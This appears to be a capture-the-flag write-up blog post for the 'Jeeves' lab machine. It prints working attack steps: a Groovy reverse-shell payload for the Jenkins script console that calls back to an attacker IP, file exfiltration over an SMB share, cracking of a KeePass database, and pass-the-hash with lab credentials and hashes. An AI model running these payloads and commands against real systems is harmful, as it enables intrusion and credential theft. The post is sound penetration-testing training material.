---
layout: post
title: "jeeves"
date: 2025-09-14 
categories: OSCP Playlist
---
# jeeves

# Summary

- Find jetty server and fuzz with ffuf
- find subdir with jenkins web app with script console
- execute reverse shell on script console
- find keepass db in user’s Documents folder
- smbserver to transfer files back to attack host
- keepass2john then crack master password to kdbx
- admin’s NT hash kept in kdbx, used NT hash to authenticate as administrator
- alternate data stream on file to keep root.txt

# Attack Path

First enumerate the open ports and services:

```bash
sudo nmap -sC -sV -oN nmap/jeeves 10.10.10.63

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
|_http-title: Ask Jeeves
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-09-14T19:03:23
|_  start_date: 2025-09-14T17:43:25
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 5h00m01s, deviation: 0s, median: 5h00m00s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
```

We see IIS web server and smb open ports and Microsoft Windows. First, let’s check whether null authentication is allowed on smb:

```bash
nxc smb 10.10.10.63 -u '' -p '' --shares

SMB         10.10.10.63     445    JEEVES           [*] Windows 10 Build 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True) 
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\: STATUS_ACCESS_DENIED 
SMB         10.10.10.63     445    JEEVES           [-] Error enumerating shares: Error occurs while reading from remote(104)

smbclient -N -L //10.10.10.63

session setup failed: NT_STATUS_ACCESS_DENIED

```

We get the computer name, but we are not authenticated.

Let’s check out the web page:

![image.png]({{ site.baseurl }}/assets/jeeves/image.png)

None of the hyperlinks seem to be working. When we searched for a random value, we get:

![image.png]({{ site.baseurl }}/assets/jeeves/image%201.png)

Turning intercept on, and resending, we realise that Search button just takes us to the error.html, we do not actually give an input.

Let’s visit the jetty web app:

![image.png]({{ site.baseurl }}/assets/jeeves/image%202.png)

Let’s fuzz:

```bash
feroxbuster -u http://10.10.10.63:50000 -C 404

ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://10.10.10.63:50000/FUZZ -ic

askjeeves               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 14ms]

```

Let’s visit:

```bash
http://10.10.10.65:50000/askjeeves
```

![image.png]({{ site.baseurl }}/assets/jeeves/image%203.png)

We get taken to a Jenkins web page. Jenkins is an automation server used for building and testing software. Looking in the credentials tab, we find it empty:

![image.png]({{ site.baseurl }}/assets/jeeves/image%204.png)

We try default credential admin:admin to try and login; did not work. Playing around the site, we find script console: 

![image.png]({{ site.baseurl }}/assets/jeeves/image%205.png)

Let’s see if we can run commands:

```bash
def cmd = "cmd.exe /c dir".execute();
println("${cmd.text}");
```

It worked:

![image.png]({{ site.baseurl }}/assets/jeeves/image%206.png)

Let’s get a reverse shell:

```bash
String host="10.10.16.7";
int port=4444;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

Before we click Run, let’s also start a listener:

```bash
nc -lnvp 4444
```

We now have shell as kohsuke user:

![image.png]({{ site.baseurl }}/assets/jeeves/image%207.png)

Let’s check our privileges:

```bash
whoami /priv

Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
```

We have SeImpersonatePrivilege.

Let’s also get some information about the system:

```bash
systeminfo

Host Name:                 JEEVES                                                                                                              
OS Name:                   Microsoft Windows 10 Pro                                                                                            
OS Version:                10.0.10586 N/A Build 10586                                                                                          
<SNIP>
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2595 Mh
Hotfix(s):                 10 Hotfix(s) Installed.
                           [01]: KB3150513
                           [02]: KB3161102
```

We got to C:\Users\Administrator\.jenkins\users\admin and find config.xml:

```bash
<?xml version='1.0' encoding='UTF-8'?>                       
<user>                                                                                                                                         
  <fullName>admin</fullName>
  <description>test&apos; or 1=1 -- -</description>                                                                                            
  <properties>                                                                                                                                 
    <jenkins.security.ApiTokenProperty>
      <apiToken>{AQAAABAAAAAwID3cR3pyZaEkaDPU25Z0S+nrU8+gDgB0JEWORJ5L1P2T+zXc/tSs2IVn1ugWLaui54D6yYki4vhXQtGhqUSeFw==}</apiToken>
    </jenkins.security.ApiTokenProperty>
    <hudson.model.MyViewsProperty>
      <views>                                                          
        <hudson.model.AllView>
          <owner class="hudson.model.MyViewsProperty" reference="../../.."/>
          <name>all</name>        
          <filterExecutors>false</filterExecutors>
          <filterQueue>false</filterQueue>               
          <properties class="hudson.model.View$PropertyList"/>
        </hudson.model.AllView>                                        
      </views>                                                         
    </hudson.model.MyViewsProperty>              
    <hudson.model.PaneStatusProperties>      
      <collapsed/>                                                     
    </hudson.model.PaneStatusProperties>
    <hudson.search.UserSearchProperty>      
      <insensitiveSearch>true</insensitiveSearch>
    </hudson.search.UserSearchProperty>
    <hudson.security.HudsonPrivateSecurityRealm_-Details>
      <passwordHash>#jbcrypt:$2a$10$QyIjgAFa7r3x8IMyqkeCluCB7ddvbR7wUn1GmFJNO2jQp2k8roehO</passwordHash>
```

Let’s attempt to use hashcat to decrypt:

```bash
.\hashcat.exe -m 3200 wordlists\hash.txt wordlists\rockyou.txt
```

We let this run in the background. Let’s also search for files in the user’s home dir. In Documents folder, we find:

```bash
CEH.kdbx
```

A keepass file. Let’s transfer it back to our host. Let’s start a smb server and copy the file over:

```bash
sudo impacket-smbserver share -smb2support . -user test -password test
```

Now on target:

```bash
net use \\10.10.16.7\share /user:test test

copy CEH.kdbx \\10.10.16.7\share\CEH.kdbx
```

Once transferred, we have to convert the file to john so we can crack the master password:

```bash
keepass2john CEH.kdbx > ceh.john

john --wordlist=/usr/share/wordlists/rockyou.txt ceh.john

moonshine1       (CEH)
```

Let’s open it now; we find passwords for all sort of users, DC Recovery PW looks the most interesting:

![image.png]({{ site.baseurl }}/assets/jeeves/image%208.png)

Let’s see if it works:

```bash
nxc smb 10.10.10.63 -u Administrator -p S1TjAtJHKsugh9oC4VZl --shares

#did not work, let's try another
```

None of the password worked. We also find a NTLM hash:

```bash
moonshine1
```

![image.png]({{ site.baseurl }}/assets/jeeves/image%209.png)

Let’s try to use that:

```bash
nxc smb 10.10.10.63 -u Administrator -H e0fb1fb85756c24235ff238cbe81fe00
```

![image.png]({{ site.baseurl }}/assets/jeeves/image%2010.png)

We can now read root.txt:

```bash
nxc smb 10.10.10.63 -u Administrator -H e0fb1fb85756c24235ff238cbe81fe00 -x "type C:\Users\Administrator\Desktop\root.txt"
```

However the root.txt file is not there. We discover alternate data stream:

An Alternate Data Stream (ADS) is a feature of the NTFS (New Technology File System) used by Windows, which allows a single file or directory to contain multiple streams of data beyond its primary content.

Each stream is essentially a separate set of data associated with the same file, identified by a unique name.

![image.png]({{ site.baseurl }}/assets/jeeves/image%2011.png)

Let’s get the content from the root.txt data stream now:

```bash
nxc smb 10.10.10.63 -u Administrator -H e0fb1fb85756c24235ff238cbe81fe00 -X 'Get-Content -Path "C:\Users\Administrator\Desktop\hm.txt" -Stream "root.txt"'

```